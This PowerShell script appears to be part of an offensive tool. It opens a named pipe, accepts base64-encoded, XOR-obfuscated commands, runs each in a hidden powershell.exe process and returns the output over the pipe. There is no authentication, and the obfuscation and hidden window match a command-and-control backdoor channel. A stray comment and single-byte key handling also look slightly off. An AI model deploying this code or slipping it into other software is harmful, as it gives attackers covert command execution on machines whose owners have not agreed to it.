# Named Pipe Server
# This implementation doesn't leverage the SMB protocol but instead relies on the 
# .NET framework's abstraction for named pipes. Local-only IPC for 
# command execution.

Param
	(
		[Parameter(Position = 0, Mandatory = $True)] [String] $p,
		[Parameter(Position = 1, Mandatory = $True)] [Byte] $k
	)

$psVersion = $PSVersionTable.PSVersion
if ($psVersion.Major -ge 5) {
	write-host "ok"
	# carry on
} else {
	Write-Host "PowerShell version is less than 5.0. Current version is: $($psVersion.ToString())"
	exit
}

$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream(
	$p, 
	[System.IO.Pipes.PipeDirection]::InOut # burger
)

Write-Host "waiting for client connection on $p pipe..."
$pipeServer.WaitForConnection()
Write-Host "client connected to $p pipe"

$reader = New-Object System.IO.StreamReader($pipeServer)
$writer = New-Object System.IO.StreamWriter($pipeServer)
$writer.AutoFlush = $true

while ($true) {
	try {
		$input = $reader.ReadLine()
		write-host "received input:" $input

		# decode input before decrypting
		$decodedCommand = [System.Convert]::FromBase64String($input)
		Write-Host "Decoded command (bytes):" $decodedCommand

		# decrypt the decodedCommand
		$commandBytes = for ($i = 0; $i -lt $decodedCommand.Length; $i++) {
			[byte]($decodedCommand[$i] -bxor $k[$i % $k.Length])
		}

		# convert back to string for processing
		$command = [System.Text.Encoding]::ASCII.GetString($commandBytes)
		Write-Host "Decrypted command:" $command

		if ($command -eq "exit") {
			Write-Host "Exiting..."
			break
		}
		Write-Host "Got command: $command"
		
		$process = New-Object System.Diagnostics.Process
		$process.StartInfo = New-Object System.Diagnostics.ProcessStartInfo
		$process.StartInfo.FileName = "powershell.exe"
		$process.StartInfo.Arguments = "-Command $command"
		$process.StartInfo.RedirectStandardOutput = $true
		$process.StartInfo.RedirectStandardError = $true
		$process.StartInfo.UseShellExecute = $false
		$process.StartInfo.CreateNoWindow = $true

		$process.Start()

		$output = $process.StandardOutput.ReadToEnd()
		$errorOutput = $process.StandardError.ReadToEnd()

		$process.WaitForExit()

		$output -split "`r?`n" | ForEach-Object { $writer.WriteLine($_) }
		$errorOutput -split "`r?`n" | ForEach-Object { $writer.WriteLine($_) }

		$writer.WriteLine("EOF")

	} catch {
		$writer.WriteLine("error: $_")
		$writer.WriteLine("EOF")
	}
}

$reader.Close()
$writer.Close()
$pipeServer.Close()
